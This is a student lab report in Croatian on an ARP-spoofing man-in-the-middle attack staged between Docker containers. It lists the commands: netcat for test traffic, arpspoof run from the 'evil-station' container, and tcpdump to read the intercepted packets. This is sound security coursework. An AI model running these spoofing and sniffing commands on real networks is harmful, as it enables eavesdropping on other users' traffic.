# Izvještaj laboratorijskih vježbi

# 1. Laboratorijska vježba

11.10.2021

## Zadatak

Realizirati man in the middle napad iskorištavanjem ranjivosti ARP protokola. Student će testirati napad u virtualiziranoj Docker mreži (Docker container networking) koju čine 3 virtualizirana Docker računala (eng. container): dvije žrtve **station-1** i **station-2** te napadač **evil-station**.

### Kloniranje GitHub repozitorija

```bash
git clone https://github.com/mcagalj/SRP-2021-22
```

### Ulazak u direktorij

```bash
cd SRP-2021-22/arp-spoofing/
```

### Running bash scripts

```
./start.sh
./stop.sh
```

### Pokrećanje iteraktivnog shella u station-1 kontenjeru

```
docker exec -it station-1 bash
```

### Provjera nalazi li se station-2 na istoj mreži

```
ping station-2
```

### Pokrećanje iteraktivnog shella u station-2 kontenjeru

```
docker exec -it station-2 bash
```

### Pomoću netcat-a otvaramo server na portu 9000 na kontenjeru station-1

```
netcat -lp 9000
```

### Pomoću netcat-a otvaramo client na hostname-u station-1 9000 na kontenjeru station-2

```
netcat station-1 9000
```

### Pokrećanje iteraktivnog shella u evil-station kontenjeru

```
docker exec -it evil-station bash
```

### Pokrećemo arpspoof u kontenjeru evil-station

```
arpspoof -t station-1 station-2
```

### U kontenjeru evil-station pokrećemo tcpdump i pratimo promet

```
tcpdump
```

```
tcpdump -X host station-1 and not arp
```

### Prekidamo napad

```
echo 0 > /proc/sys/net/ipv4/ip_forward
```

![Untitled](Izvjes%CC%8Ctaj%20laboratorijskih%20vjez%CC%8Cbi%207f8db425248d48e9bf2d2fa1cffd0156/Untitled.png)